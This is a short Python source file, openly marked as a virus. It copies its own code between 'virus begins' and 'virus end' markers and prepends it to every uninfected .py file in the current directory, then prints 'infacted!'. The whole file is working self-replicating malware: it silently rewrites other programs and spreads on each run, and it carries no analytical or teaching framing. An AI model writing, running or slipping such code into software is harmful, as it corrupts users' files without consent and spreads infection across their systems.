#### virus begins ####
import sys,glob,re

#get a copy of virus
vCode = []
fh = open(sys.argv[0],"r")
lines = fh.readlines()
fh.close()

inVirus = False
virusEnd = 0

for line in lines:
    if(re.search("#### virus begins ####",line)): inVirus = True
    if(inVirus): vCode.append(line)
    if(re.search("#### virus end ####",line)): 

        vCode.append("\n")
        virusEnd = virusEnd + 1
        if(virusEnd > 2):  
            break

#find potential victim
progs  = glob.glob("*.py")

#check & infect
for prog in progs:
    fh = open(prog,"r")
    pCode = fh.readlines()
    fh.close()
    infacted = False
    for line in pCode:
        if("#### virus begins ####" in line):
            infacted = True
            break
    if not infacted:
        newcCode = []
        if("#!" in pCode[0]): newcCode.append(pCode.pop(0))
        newcCode.extend(vCode)
        newcCode.extend(pCode) 

        #writing virus
        fh = open(prog,"w")
        fh.writelines(newcCode)
        fh.close()

#optional payload
print ("infacted!")
virusEnd = virusEnd + 1
#### virus end ####
print('its one')
